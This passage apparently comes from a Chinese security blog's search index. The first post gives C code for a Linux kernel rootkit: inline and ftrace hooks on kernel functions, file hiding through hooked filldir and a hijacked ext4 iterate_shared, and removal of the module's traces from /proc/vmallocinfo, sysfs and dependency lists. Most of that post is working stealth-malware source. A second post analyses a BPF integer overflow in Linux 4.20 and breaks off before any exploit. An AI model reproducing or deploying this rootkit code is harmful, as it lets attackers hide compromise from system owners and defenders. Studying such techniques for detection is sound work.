dst_ioremap_addr = (size_t)ioremap(dst_phys_page_addr, len + 0x1000);    memcpy(dst_ioremap_addr + dst_offset, src, len);    iounmap(dst_ioremap_addr);&#125;struct hook_info&#123;    char hook_data[HOOK_BUF_SZ];    char orig_data[HOOK_BUF_SZ];    size_t (*orig_func)(size_t, size_t, size_t, size_t, size_t, size_t);&#125;;struct hook_info temp_hook_info;size_t rootkit_evil_hook_fn_temp(size_t arg0, size_t arg1, size_t arg2,                                 size_t arg3, size_t arg4, size_t arg5)&#123;    size_t args[6], ret;    args[0] = arg0;    args[1] = arg1;    args[2] = arg2;    args[3] = arg3;    args[4] = arg4;    args[5] = arg5;    rootkit_write_read_only_mem_by_ioremap(temp_hook_info.orig_func,                                           temp_hook_info.orig_data,                                           HOOK_BUF_SZ);    // ......    ret = temp_hook_info.orig_func(args[0], args[1], args[2],                                   args[3], args[4], args[5]);    rootkit_write_read_only_mem_by_ioremap(temp_hook_info.orig_func,                                           temp_hook_info.hook_data,                                           HOOK_BUF_SZ);    return ret;&#125;void rootkit_text_hook(void *hook_dst, void *new_dst, struct hook_info *info)&#123;    size_t jmp_offset;    info-&gt;orig_func = hook_dst;    memcpy(&amp;info-&gt;orig_data, info-&gt;orig_func, HOOK_BUF_SZ);    jmp_offset = (size_t)new_dst - (size_t)hook_dst - 12;    info-&gt;hook_data[0] = 0xE9;    *(size_t *)(&amp;info-&gt;hook_data[1]) = jmp_offset;    rootkit_write_read_only_mem_by_ioremap(info-&gt;orig_func, &amp;info-&gt;hook_data,                                           HOOK_BUF_SZ);&#125;\n\n上述则是对动态inline hook的实现代码。\nftrace hookftrace是内核提供的一个调试框架，当内核编译时开启了CONFIG_FUNCTION_TRACER选项可以使用ftrace来对内核函数调用进行追踪。\nftrace通过在函数开头插入fentry或mcount实现，为了降低性能损耗，在编译时会在函数的开头插入 nop 指令，当开启 frace 时再动态地将待跟踪函数开头的 nop 指令替换为跳转指令。\ntypedef void (*ftrace_func_t)(unsigned long ip, unsigned long parent_ip,\t\t\t      struct ftrace_ops *op, struct ftrace_regs *fregs);struct ftrace_ops &#123;\tftrace_func_t\t\t\tfunc;\tstruct ftrace_ops __rcu\t\t*next;\tunsigned long\t\t\tflags;\tvoid\t\t\t\t*private;\tftrace_func_t\t\t\tsaved_func;#ifdef CONFIG_DYNAMIC_FTRACE\tstruct ftrace_ops_hash\t\tlocal_hash;\tstruct ftrace_ops_hash\t\t*func_hash;\tstruct ftrace_ops_hash\t\told_hash;\tunsigned long\t\t\ttrampoline;\tunsigned long\t\t\ttrampoline_size;\tstruct list_head\t\tlist;\tftrace_ops_func_t\t\tops_func;#ifdef CONFIG_DYNAMIC_FTRACE_WITH_DIRECT_CALLS\tunsigned long\t\t\tdirect_call;#endif#endif&#125;;\n\nftrace的核心结构就是ftrace_ops，其中的func成员就是最终会被调用的函数。\n/** * ftrace_set_filter_ip - set a function to filter on in ftrace by address * @ops: the ops to set the filter with * @ip: the address to add to or remove from the filter. * @remove: non zero to remove the ip from the filter * @reset: non zero to reset all filters before applying this filter. * * Filters denote which functions should be enabled when tracing is enabled * If @ip is NULL, it fails to update filter. * * This can allocate memory which must be freed before @ops can be freed, * either by removing each filtered addr or by using * ftrace_free_filter(@ops). */int ftrace_set_filter_ip(struct ftrace_ops *ops, unsigned long ip,\t\t\t int remove, int reset)\n\n当创建好一个ftrace_ops之后，可以使用上述ftrace_set_filter_ip函数将其注册到filter中，同样也可以使用该函数将ftrace_ops从filter中删除。在完成注册操作后可以使用register_ftrace_function函数将其放置到hook点位上，同样可以使用unregister_ftrace_function函数将其脱离。\nstruct ftrace_ops *rootkit_ftrace_hook_install(void *hook_dst,                                               ftrace_func_t new_dst)&#123;    struct ftrace_ops *hook_ops;    int err;    hook_ops = kmalloc(GFP_KERNEL, sizeof(*hook_ops));    hook_ops-&gt;func = new_dst;    hook_ops-&gt;flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;    err = ftrace_set_filter_ip(hook_ops, hook_dst, 0, 0);    if (err)    &#123;        printk(KERN_ERR &quot;[rootkit:] failed to set ftrace filter.&quot;);        goto failed;    &#125;    err = register_ftrace_function(hook_ops);    if (err)    &#123;        printk(KERN_ERR &quot;[rootkit:] failed to register ftrace fn.&quot;);        goto failed;    &#125;    printk(KERN_INFO &quot;[rootkit:] register ftrace hook at %p&quot;, hook_dst);    return hook_ops;failed:    kfree(hook_ops);    return NULL;&#125;int rootkit_ftrace_hook_remove(struct ftrace_ops *hook_ops, void *hook_dst)&#123;    int err;    err = unregister_ftrace_function(hook_ops);    if (err)    &#123;        printk(KERN_ERR &quot;[rootkit:] failed to unregister ftrace.&quot;);        goto out;    &#125;    err = ftrace_set_filter_ip(hook_ops, hook_dst, 1, 0);    if (err)    &#123;        printk(KERN_ERR &quot;[rootkit:] failed to rmove ftrace point.&quot;);        goto out;    &#125;out:    return err;&#125;\n\n文件隐藏在前一篇文章中虽然提到的文件隐藏但是只是针对仅存在于内存中的文件系统\nconst struct file_operations simple_dir_operations = &#123;\t.open\t\t= dcache_dir_open,\t.release\t= dcache_dir_close,\t.llseek\t\t= dcache_dir_lseek,\t.read\t\t= generic_read_dir,\t.iterate_shared\t= dcache_readdir,\t.fsync\t\t= noop_fsync,&#125;;EXPORT_SYMBOL(simple_dir_operations);\n\n这类文件系统通常使用simple_dir_operations作为函数表，文件遍历函数为dcache_readdir。\n但是对于现实环境中的大多系统通常使用的ext4文件系统，前面针对内核的隐藏行就不那么行的通了。\n劫持getdents系统调用核心函数在使用ls查看目录下的文件时，实际上会调用getdents64/getdents/compat_getdents这三个系统调用其中的一个，而他们的核心逻辑都是iterate_dir实现的。\nint iterate_dir(struct file *file, struct dir_context *ctx)&#123;\tstruct inode *inode = file_inode(file);\tint res = -ENOTDIR;\tif (!file-&gt;f_op-&gt;iterate_shared)\t\tgoto out;\tres = security_file_permission(file, MAY_READ);\tif (res)\t\tgoto out;\tres = fsnotify_file_perm(file, MAY_READ);\tif (res)\t\tgoto out;\tres = down_read_killable(&amp;inode-&gt;i_rwsem);\tif (res)\t\tgoto out;\tres = -ENOENT;\tif (!IS_DEADDIR(inode)) &#123;\t\tctx-&gt;pos = file-&gt;f_pos;\t\tres = file-&gt;f_op-&gt;iterate_shared(file, ctx);\t\tfile-&gt;f_pos = ctx-&gt;pos;\t\tfsnotify_access(file);\t\tfile_accessed(file);\t&#125;\tinode_unlock_shared(inode);out:\treturn res;&#125;EXPORT_SYMBOL(iterate_dir);\n\n最终都会调用到file-&gt;f_op-&gt;iterate_shared。\nconst struct file_operations ext4_dir_operations = &#123;\t.llseek\t\t= ext4_dir_llseek,\t.read\t\t= generic_read_dir,\t.iterate_shared\t= ext4_readdir,\t.unlocked_ioctl = ext4_ioctl,#ifdef CONFIG_COMPAT\t.compat_ioctl\t= ext4_compat_ioctl,#endif\t.fsync\t\t= ext4_sync_file,\t.release\t= ext4_release_dir,&#125;;\n\n以ext4为例，最终调用ext4_readdir函数。其存在这样一条调用链ext4_readdir =&gt; ext4_dx_readdir =&gt; call_filldir =&gt; dir_emit =&gt; ctx-&gt;actor。\n上述调用链中填充数据并返回给用户态的核心函数便是调用ctx-&gt;actor，而其真正调用的是filldir/filldir64/compat_filldir函数。\n所以结合前文的函数劫持技术，这里可以直接对filldir/filldir64/compat_filldir函数进行劫持，在遇到我们隐藏文件时直接返回从而达到隐藏文件的效果。\nstruct hook_info filldir_hook_info, filldir64_hook_info, compat_filldir_hook_info;filldir_t filldir, filldir64, compat_filldir;struct hide_file_info&#123;    struct list_head list;    char *file_name;&#125;;struct list_head hide_file_list;size_t rootkit_evil_filldir64(size_t arg0, size_t arg1, size_t arg2,                              size_t arg3, size_t arg4, size_t arg5)&#123;    struct hide_file_info *info = NULL;    size_t args[6], ret;    args[0] = arg0;    args[1] = arg1;    args[2] = arg2;    args[3] = arg3;    args[4] = arg4;    args[5] = arg5;    rootkit_write_read_only_mem_by_ioremap(filldir_hook_info.orig_func,                                           filldir_hook_info.orig_data,                                           HOOK_BUF_SZ);    list_for_each_entry(info, &amp;hide_file_list, list)    &#123;        if (!strncmp(info-&gt;file_name, args[1], args[2]))        &#123;            ret = 1;            goto hide_out;        &#125;    &#125;    ret = filldir_hook_info.orig_func(args[0], args[1], args[2],                                      args[3], args[4], args[5]);hide_out:    rootkit_write_read_only_mem_by_ioremap(filldir_hook_info.orig_func,                                           filldir_hook_info.hook_data,                                           HOOK_BUF_SZ);    return ret;&#125;void rootkit_hide_file_subsystem_init(void)&#123;    INIT_LIST_HEAD(&amp;hide_file_list);    rootkit_text_hook(filldir, rootkit_evil_filldir,                      &amp;filldir_hook_info);    rootkit_text_hook(filldir64, rootkit_evil_filldir64,                      &amp;filldir64_hook_info);    rootkit_text_hook(compat_filldir, rootkit_evil_compat_filldir,                      &amp;compat_filldir_hook_info);&#125;void rootkit_add_new_hide_file(const char *file_name)&#123;    struct hide_file_info *info;    info = kmalloc(sizeof(*info), GFP_KERNEL);    info-&gt;file_name = kmalloc(strlen(file_name) + 1, GFP_KERNEL);    strcpy(info-&gt;file_name, file_name);    list_add(&amp;info-&gt;list, &amp;hide_file_list);&#125;\n\n劫持对应文件系统的VFS函数表前面提到便利文件一定会调用到iterate_dir函数，而其又会调用函数表中的iterate_shared函数，所以这里通过劫持函数表中的iterate_shared函数为我们自己的函数，随后在修改ctx劫持ctx-&gt;actor为我们自己的函数即可。\nstruct hook_info filldir_hook_info,filldir64_hook_info,compat_filldir_hook_info;filldir_t filldir, filldir64, compat_filldir;struct file_operations *ext4_dir_operations;struct hide_file_info &#123;    struct list_head list;    char *file_name;&#125;;struct list_head hide_file_list;static int rootkit_fake_filldir(struct dir_context *ctx, const char *name,                                   int namlen, loff_t offset, u64 ino,                                    unsigned int d_type)&#123;    if (rootkit_check_file_to_hide(name, namlen)) &#123;        return 1;    &#125;    return filldir(ctx, name, namlen, offset, ino, d_type);&#125;static int rootkit_fake_filldir64(struct dir_context *ctx, const char *name,                                     int namlen, loff_t offset, u64 ino,                                      unsigned int d_type)&#123;    if (rootkit_check_file_to_hide(name, namlen)) &#123;        return 1;    &#125;    return filldir64(ctx, name, namlen, offset, ino, d_type);&#125;static int rootkit_fake_compat_filldir(struct dir_context *ctx, const char *name,                                          int namlen, loff_t offset, u64 ino,                                           unsigned int d_type)&#123;    if (rootkit_check_file_to_hide(name, namlen)) &#123;        return 1;    &#125;    return compat_filldir(ctx, name, namlen, offset, ino, d_type);&#125;int (*orig_ext4_iterate_shared) (struct file *, struct dir_context *);static int rootkit_fake_ext4_iterate_shared(struct file *file,                                                struct dir_context *ctx)&#123;    if (ctx-&gt;actor == filldir) &#123;        ctx-&gt;actor = (void*) rootkit_fake_filldir;    &#125; else if (ctx-&gt;actor == filldir64) &#123;        ctx-&gt;actor = (void*) rootkit_fake_filldir64;    &#125; else if (ctx-&gt;actor == compat_filldir) &#123;        ctx-&gt;actor = (void*) rootkit_fake_compat_filldir;    &#125; else &#123;        panic(&quot;Unexpected ctx-&gt;actor!&quot;);    &#125;    return orig_ext4_iterate_shared(file, ctx);&#125;void rootkit_vfs_hide_file_subsystem_init(void)&#123;    struct file *file;    INIT_LIST_HEAD(&amp;hide_file_list);    rootkit_disable_write_protect();    file = filp_open(&quot;/&quot;, O_RDONLY, 0);    if (IS_ERR(file)) &#123;        goto out;    &#125;    ext4_dir_operations = file-&gt;f_op;    printk(KERN_ERR &quot;Got addr of ext4_dir_operations: %lx&quot;,ext4_dir_operations);    orig_ext4_iterate_shared = ext4_dir_operations-&gt;iterate_shared;    ext4_dir_operations-&gt;iterate_shared = rootkit_fake_ext4_iterate_shared;    filp_close(file, NULL);out:    rootkit_enable_write_protect();&#125;void rootkit_add_new_hide_file(const char *file_name)&#123;    struct hide_file_info *info;    info = kmalloc(sizeof(*info), GFP_KERNEL);    info-&gt;file_name = kmalloc(strlen(file_name) + 1, GFP_KERNEL);    strcpy(info-&gt;file_name, file_name);    list_add(&amp;info-&gt;list, &amp;hide_file_list);&#125;\n\n其余信息隐藏/proc/vmallocinfo隐藏内核模块的内存是通过 vmap 机制进行动态分配的，该机制用以分配一块虚拟地址连续的内存。主要原理是在对应的虚拟地址空间中找到足够大的一块空闲区域，之后建立虚拟地址到物理页面的映射，对于内核模块而言为 ffffffffa0000000~fffffffffeffffff。\n在内核当中所有非连续映射的内核虚拟空间都有着一个对应的 vmap_area 结构体进行表示，其中 vmap_area 结构在内核当中同时以红黑树（负责根据虚拟地址进行快速索引）与链表进行组织\n\n当我们读取/proc/vmallocinfo文件时我们可以所有通过vmap机制分配的内存信息，其中包含rootkit所存在的内存区域\n~ # cat /proc/vmallocinfo | grep load_module0x(____ptrval____)-0x(____ptrval____)   20480 load_module+0x1959/0x2b90 pages=4 vmalloc N0=4~ # \n\n通过检测系统中rootkit思路是可以通过这里泄漏出来的地址来实现找到rootkit的，因此还需要进行隐藏。\nstatic int __init proc_vmalloc_init(void)&#123;\tif (IS_ENABLED(CONFIG_NUMA))\t\tproc_create_seq_private(&quot;vmallocinfo&quot;, 0400, NULL,\t\t\t\t&amp;vmalloc_op,\t\t\t\tnr_node_ids * sizeof(unsigned int), NULL);\telse\t\tproc_create_seq(&quot;vmallocinfo&quot;, 0400, NULL, &amp;vmalloc_op);\treturn 0;&#125;module_init(proc_vmalloc_init);\n\n/proc/vmallocinfo的实现类似于/proc/module。\nstatic void *s_next(struct seq_file *m, void *p, loff_t *pos)&#123;\treturn seq_list_next(p, &amp;vmap_area_list, pos);&#125;\n\n这里是通过vmap_area_list遍历的，所以从这一全局链表中摘除即可。\n#include &lt;linux/rbtree.h&gt;#include &lt;linux/vmalloc.h&gt;/* You should get it from /proc/kallsyms */struct rb_root *vmap_area_root;struct list_head *_vmap_area_list;void rootkit_hide_module_meminfo(void)&#123;    struct vmap_area *va, *tmp_va;    unsigned long mo_addr;    mo_addr = (unsigned long) THIS_MODULE;    list_for_each_entry_safe(va, tmp_va, _vmap_area_list, list) &#123;        if (mo_addr &gt; va-&gt;va_start &amp;&amp; mo_addr &lt; va-&gt;va_end) &#123;            list_del(&amp;va-&gt;list);        &#125;    &#125;&#125;\n\n/sys/device/virtual隐藏我们在创建rootkit的时候并没有指定父类设备，而所有没有父类的设备在/sys/device/virtual/目录下都会存在文件夹。\n这里首先审视一下device_create函数\ndevice_create =&gt; device_create_groups_vargs =&gt; device_add =&gt; get_device_parent =&gt; virtual_device_parent &amp;&amp; class_dir_create_and_add\n\n在创建设备时会存上如上调用链\nstruct kobject *virtual_device_parent(struct device *dev)&#123;\tstatic struct kobject *virtual_dir = NULL;\tif (!virtual_dir)\t\tvirtual_dir = kobject_create_and_add(&quot;virtual&quot;,\t\t\t\t\t\t     &amp;devices_kset-&gt;kobj);\treturn virtual_dir;&#125;\n\nvirtual_device_parent这一函数作用很容易看出来就是获取virtual文件夹。\nstatic struct kobject *class_dir_create_and_add(struct class *class, struct kobject *parent_kobj)&#123;\tstruct class_dir *dir;\tint retval;\tdir = kzalloc(sizeof(*dir), GFP_KERNEL);\tif (!dir)\t\treturn ERR_PTR(-ENOMEM);\tdir-&gt;class = class;\tkobject_init(&amp;dir-&gt;kobj, &amp;class_dir_ktype);\tdir-&gt;kobj.kset = &amp;class-&gt;p-&gt;glue_dirs;\tretval = kobject_add(&amp;dir-&gt;kobj, parent_kobj, &quot;%s&quot;, class-&gt;name);\tif (retval &lt; 0) &#123;\t\tkobject_put(&amp;dir-&gt;kobj);\t\treturn ERR_PTR(retval);\t&#125;\treturn &amp;dir-&gt;kobj;&#125;\n\n而 class_dir_create_and_add 会创建一个新的 class_dir ，添加到前面获得的 /sys/devices/virtual 对应的 kobject上。\nget_device_parent 会将新建的 class_dir 作为 kobject 返回给 device_add() ，之后其会被赋给 dev-&gt;kobj.parent\nvoid rootkit_hide_module_sys_device_virtual(void)&#123;    kobject_del(module_device-&gt;kobj.parent);&#125;\n\n所以这里只需进行如上操作即可隐藏。\n模块依赖关系隐藏模块依赖关系会被记录到sys/module/依赖模块/holder/中。\n/* modules using other modules: kdb wants to see this. */struct module_use &#123;    struct list_head source_list;    struct list_head target_list;    struct module *source, *target;&#125;;\n\n依赖关系通过这一结构体来表示，本质依旧是链表构建的依赖关系。\nvoid rootkit_hide_module_dependency(void)&#123;    struct module_use *use, *tmp;    list_for_each_entry_safe(use, tmp, &amp;THIS_MODULE-&gt;target_list, target_list) &#123;        list_del(&amp;use-&gt;source_list);        list_del(&amp;use-&gt;target_list);        sysfs_remove_link(use-&gt;target-&gt;holders_dir, THIS_MODULE-&gt;name);    &#125;&#125;\n\n因此还是只需要进行脱链操作即可。\n\n参考链接：\nhttps://xz.aliyun.com/t/12439\n","categories":["Linux Kernel"],"tags":["LKM"]},{"title":"Linux kernel 4.20 BPF 整数溢出漏洞","url":"/2022/10/02/Linux-kernel-4-20-BPF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/","content":"题目会放在:https://github.com/196082/196082\n漏洞分析kernel中的bpf模块主要用于用户态定义数据包过滤方法，如常见的抓包工具都基于此实现，并且用户态的Seccomp功能也与此功能相似。\n整数溢出该漏洞存在于BPF_MAP_CREATE功能中，并且可以看到处理的函数是map_create。\nSYSCALL_DEFINE3(bpf, int, cmd, union bpf_attr __user *, uattr, unsigned int, size)&#123;  union bpf_attr attr = &#123;&#125;;  int err;  if (sysctl_unprivileged_bpf_disabled &amp;&amp; !capable(CAP_SYS_ADMIN))    return -EPERM;  err = bpf_check_uarg_tail_zero(uattr, sizeof(attr), size);  if (err)    return err;  size = min_t(u32, size, sizeof(attr));  /* copy attributes from user space, may be less than sizeof(bpf_attr) */  if (copy_from_user(&amp;attr, uattr, size) != 0)    return -EFAULT;  err = security_bpf(cmd, &amp;attr, size);  if (err &lt; 0)    return err;  switch (cmd) &#123;    case BPF_MAP_CREATE:      err = map_create(&amp;attr);      break;    case BPF_MAP_LOOKUP_ELEM:      err = map_lookup_elem(&amp;attr);      break;    case BPF_MAP_UPDATE_ELEM:      err = map_update_elem(&amp;attr);      break;      // ...  &#125;\n\n可以看到下面使用find_and_alloc_map函数创建一个map结构体，并为其分配编号，然后寻找出来生成的map。\nstatic int map_create(union bpf_attr *attr)&#123;  int numa_node = bpf_map_attr_numa_node(attr);  struct bpf_map *map;  int f_flags;  int err;  err = CHECK_ATTR(BPF_MAP_CREATE);  if (err)    return -EINVAL;  f_flags = bpf_get_file_flag(attr-&gt;map_flags);  if (f_flags &lt; 0)    return f_flags;  if (numa_node != NUMA_NO_NODE &amp;&amp;      ((unsigned int)numa_node &gt;= nr_node_ids ||       !node_online(numa_node)))    return -EINVAL;  /* find map type and init map: hashtable vs rbtree vs bloom vs ... */  map = find_and_alloc_map(attr);  if (IS_ERR(map))    return PTR_ERR(map);  err = bpf_obj_name_cpy(map-&gt;name, attr-&gt;map_name);  if (err)    goto free_map_nouncharge;  atomic_set(&amp;map-&gt;refcnt, 1);  atomic_set(&amp;map-&gt;usercnt, 1);  if (attr-&gt;btf_key_type_id || attr-&gt;btf_value_type_id) &#123;    struct btf *btf;    if (!attr-&gt;btf_key_type_id || !attr-&gt;btf_value_type_id) &#123;      err = -EINVAL;      goto free_map_nouncharge;    &#125;    btf = btf_get_by_fd(attr-&gt;btf_fd);    if (IS_ERR(btf)) &#123;      err = PTR_ERR(btf);      goto free_map_nouncharge;    &#125;    err = map_check_btf(map, btf, attr-&gt;btf_key_type_id,                        attr-&gt;btf_value_type_id);    if (err) &#123;      btf_put(btf);      goto free_map_nouncharge;    &#125;    map-&gt;btf = btf;    map-&gt;btf_key_type_id = attr-&gt;btf_key_type_id;    map-&gt;btf_value_type_id = attr-&gt;btf_value_type_id;  &#125;  err = security_bpf_map_alloc(map);  if (err)    goto free_map_nouncharge;  err = bpf_map_init_memlock(map);  if (err)    goto free_map_sec;  err = bpf_map_alloc_id(map);  if (err)    goto free_map;  err = bpf_map_new_fd(map, f_flags);  if (err &lt; 0) &#123;    /* failed to allocate fd.\t\t * bpf_map_put() is needed because the above\t\t * bpf_map_alloc_id() has published the map\t\t * to the userspace and the userspace may\t\t * have refcnt-ed it through BPF_MAP_GET_FD_BY_ID.\t\t */    bpf_map_put(map);    return err;  &#125;  return err;  free_map:  bpf_map_release_memlock(map);  free_map_sec:  security_bpf_map_free(map);  free_map_nouncharge:  btf_put(map-&gt;btf);  map-&gt;ops-&gt;map_free(map);  return err;&#125;\n\n下面分析find_and_alloc_map函数，那么首先还是先看一下传参结构体的定义：\nunion bpf_attr &#123;\tstruct &#123; /* anonymous struct used by BPF_MAP_CREATE command */\t\t__u32\tmap_type;\t/* one of enum bpf_map_type */\t\t__u32\tkey_size;\t/* size of key in bytes */\t\t__u32\tvalue_size;\t/* size of value in bytes */\t\t__u32\tmax_entries;\t/* max number of entries in a map */\t\t__u32\tmap_flags;\t/* BPF_MAP_CREATE related\t\t\t\t\t * flags defined above.\t\t\t\t\t */\t\t__u32\tinner_map_fd;\t/* fd pointing to the inner map */\t\t__u32\tnuma_node;\t/* numa node (effective only if\t\t\t\t\t * BPF_F_NUMA_NODE is set).\t\t\t\t\t */\t\tchar\tmap_name[BPF_OBJ_NAME_LEN];\t\t__u32\tmap_ifindex;\t/* ifindex of netdev to create on */\t\t__u32\tbtf_fd;\t\t/* fd pointing to a BTF type data */\t\t__u32\tbtf_key_type_id;\t/* BTF type_id of the key */\t\t__u32\tbtf_value_type_id;\t/* BTF type_id of the value */\t&#125;;  // ...&#125;\n\nstatic struct bpf_map *find_and_alloc_map(union bpf_attr *attr)&#123;\tconst struct bpf_map_ops *ops;\tu32 type = attr-&gt;map_type;\tstruct bpf_map *map;\tint err;\tif (type &gt;= ARRAY_SIZE(bpf_map_types))\t\treturn ERR_PTR(-EINVAL);\ttype = array_index_nospec(type, ARRAY_SIZE(bpf_map_types));\tops = bpf_map_types[type];\tif (!ops)\t\treturn ERR_PTR(-EINVAL);\tif (ops-&gt;map_alloc_check) &#123;\t\terr = ops-&gt;map_alloc_check(attr);\t\tif (err)\t\t\treturn ERR_PTR(err);\t&#125;\tif (attr-&gt;map_ifindex)\t\tops = &amp;bpf_map_offload_ops;\tmap = ops-&gt;map_alloc(attr);\tif (IS_ERR(map))\t\treturn map;\tmap-&gt;ops = ops;\tmap-&gt;map_type = type;\treturn map;&#125;\n\n可以看到这里是首先根据type作为索引得到ops，最后再调用ops中的map_alloc函数但是可以注意到的是在数组中存在以下的ops结构体\nconst struct bpf_map_ops queue_map_ops = &#123;\t.map_alloc_check = queue_stack_map_alloc_check,\t.map_alloc = queue_stack_map_alloc,\t.map_free = queue_stack_map_free,\t.map_lookup_elem = queue_stack_map_lookup_elem,\t.map_update_elem = queue_stack_map_update_elem,\t.map_delete_elem = queue_stack_map_delete_elem,\t.map_push_elem = queue_stack_map_push_elem,\t.map_pop_elem = queue_map_pop_elem,\t.map_peek_elem = queue_map_peek_elem,\t.map_get_next_key = queue_stack_map_get_next_key,&#125;;\n\n这里的漏洞也就存在于上述结构体中的queue_stack_map_alloc函数。\n.text:FFFFFFFF8119D17A 44 89 F0                      mov     eax, r14d.text:FFFFFFFF8119D17D 4C 8B 3C C5 80 83 02 82       mov     r15, ds:qword_FFFFFFFF82028380[rax*8]  .rodata:FFFFFFFF82028380 qword_FFFFFFFF82028380   dq 0                    ; DATA XREF: map_create+AD↑r; ... ....rodata:FFFFFFFF82028410                 dq offset unk_FFFFFFFF8210F0A0.rodata:FFFFFFFF82028418                 dq offset unk_FFFFFFFF82029B00.rodata:FFFFFFFF82028420                 dq offset unk_FFFFFFFF8202A680.rodata:FFFFFFFF82028428                 dq offset unk_FFFFFFFF82029B00.rodata:FFFFFFFF82028430                 dq offset unk_FFFFFFFF82029C40.rodata:FFFFFFFF82028438                 dq offset off_FFFFFFFF82029BA0; ... ....rodata:FFFFFFFF82029BA0                 dq offset queue_stack_map_alloc_check.rodata:FFFFFFFF82029BA8                 dq offset queue_stack_map_alloc.rodata:FFFFFFFF82029BB0                 dq 0.rodata:FFFFFFFF82029BB8                 dq offset queue_stack_map_free.rodata:FFFFFFFF82029BC0                 dq offset queue_stack_map_get_next_key.rodata:FFFFFFFF82029BC8                 dq 0.rodata:FFFFFFFF82029BD0                 dq offset queue_stack_map_lookup_elem.rodata:FFFFFFFF82029BD8                 dq offset queue_stack_map_update_elem.rodata:FFFFFFFF82029BE0                 dq offset queue_stack_map_delete_elem.rodata:FFFFFFFF82029BE8                 dq offset queue_stack_map_push_elem.rodata:FFFFFFFF82029BF0                 dq offset stack_map_pop_elem.rodata:FFFFFFFF82029BF8                 dq offset stack_map_peek_elem\n\n可以看到只要计算偏移就可以成功修改ops为queue_stack_map_alloc函数，经过计算可得type为:(0xFFFFFFFF82028438 - 0xFFFFFFFF82028380）/8 = 0x17 。\nstatic struct bpf_map *queue_stack_map_alloc(union bpf_attr *attr)&#123;\tint ret, numa_node = bpf_map_attr_numa_node(attr);\tstruct bpf_queue_stack *qs;\tu64 size, queue_size, cost;\tsize = (u64) attr-&gt;max_entries + 1;\tcost = queue_size = sizeof(*qs) + size * attr-&gt;value_size;\tif (cost &gt;= U32_MAX - PAGE_SIZE)\t\treturn ERR_PTR(-E2BIG);\tcost = round_up(cost, PAGE_SIZE) &gt;&gt; PAGE_SHIFT;\tret = bpf_map_precharge_memlock(cost);\tif (ret &lt; 0)\t\treturn ERR_PTR(ret);\tqs = bpf_map_area_alloc(queue_size, numa_node);\tif (!qs)\t\treturn ERR_PTR(-ENOMEM);\tmemset(qs, 0, sizeof(*qs));\tbpf_map_init_from_attr(&amp;qs-&gt;map, attr);\tqs-&gt;map.pages = cost;\tqs-&gt;size = size;\traw_spin_lock_init(&amp;qs-&gt;lock);\treturn &amp;qs-&gt;map;&#125;\n\n可以看到这里的cost其实就是等于sizeof(*qs) + (attr-&gt;value_size) * (attr-&gt;max_entries+1)，并且这里的attr是我们可控的，如果我们控制attr-&gt;max_entries为-1那么这里申请的大小只有sizeof(struct bpf_queue_stack)并且这个size其实是管理堆块的大小，用于存储数据结构，后面的内容为数据存储结构。\nvoid bpf_map_init_from_attr(struct bpf_map *map, union bpf_attr *attr)&#123;\tmap-&gt;map_type = attr-&gt;map_type;\tmap-&gt;key_size = attr-&gt;key_size;\tmap-&gt;value_size = attr-&gt;value_size;\tmap-&gt;max_entries = attr-&gt;max_entries;\tmap-&gt;map_flags = attr-&gt;map_flags;\tmap-&gt;numa_node = bpf_map_attr_numa_node(attr);&#125;\n\n最后将用户传进来的attr赋值过去。最后生成id，并将id返回给用户。\n堆溢出可以看到在上面的系统调用中存在BPF_MAP_UPDATE_ELEM功能，其实现的函数为：map_update_elem\nstatic int map_update_elem(union bpf_attr *attr)&#123;  void __user *ukey = u64_to_user_ptr(attr-&gt;key);  void __user *uvalue = u64_to_user_ptr(attr-&gt;value);  int ufd = attr-&gt;map_fd;  struct bpf_map *map;  void *key, *value;  u32 value_size;  struct fd f;  int err;  if (CHECK_ATTR(BPF_MAP_UPDATE_ELEM))    return -EINVAL;  f = fdget(ufd);  map = __bpf_map_get(f);  if (IS_ERR(map))    return PTR_ERR(map);  if (!(f.file-&gt;f_mode &amp; FMODE_CAN_WRITE)) &#123;    err = -EPERM;    goto err_put;  &#125;  key = __bpf_copy_key(ukey, map-&gt;key_size);  if (IS_ERR(key)) &#123;    err = PTR_ERR(key);    goto err_put;  &#125;  if (map-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||      map-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH ||      map-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY ||      map-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE)    value_size = round_up(map-&gt;value_size, 8) * num_possible_cpus();  else    value_size = map-&gt;value_size;  err = -ENOMEM;  value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);  if (!value)    goto free_key;  err = -EFAULT;  if (copy_from_user(value, uvalue, value_size) != 0)    goto free_value;  /* Need to create a kthread, thus must support schedule */  if (bpf_map_is_dev_bound(map)) &#123;    err = bpf_map_offload_update_elem(map, key, value, attr-&gt;flags);    goto out;  &#125; else if (map-&gt;map_type == BPF_MAP_TYPE_CPUMAP ||             map-&gt;map_type == BPF_MAP_TYPE_SOCKHASH ||             map-&gt;map_type == BPF_MAP_TYPE_SOCKMAP) &#123;    err = map-&gt;ops-&gt;map_update_elem(map, key, value, attr-&gt;flags);    goto out;  &#125;// ...&#125;\n\n可以看到这里是直接取出map中存储的value_size直接kmalloc一个堆块，然后从用户态copy内容到堆块上面。随后调用ops中的map_update_elem函数。\nstatic int queue_stack_map_push_elem(struct bpf_map *map, void *value,                                     u64 flags)&#123;  struct bpf_queue_stack *qs = bpf_queue_stack(map);  unsigned long irq_flags;  int err = 0;  void *dst;  /* BPF_EXIST is used to force making room for a new element in case the\t * map is full\t */  bool replace = (flags &amp; BPF_EXIST);  /* Check supported flags for queue and stack maps */  if (flags &amp; BPF_NOEXIST || flags &gt; BPF_EXIST)    return -EINVAL;  raw_spin_lock_irqsave(&amp;qs-&gt;lock, irq_flags);  if (queue_stack_map_is_full(qs)) &#123;    if (!replace) &#123;      err = -E2BIG;      goto out;    &#125;    /* advance tail pointer to overwrite oldest element */    if (unlikely(++qs-&gt;tail &gt;= qs-&gt;size))      qs-&gt;tail = 0;  &#125;  dst = &amp;qs-&gt;elements[qs-&gt;head * qs-&gt;map.value_size];  memcpy(dst, value, qs-&gt;map.value_size);  if (unlikely(++qs-&gt;head &gt;= qs-&gt;size))    qs-&gt;head = 0;  out:  raw_spin_unlock_irqrestore(&amp;qs-&gt;lock, irq_flags);  return err;&#125;\n\nstruct 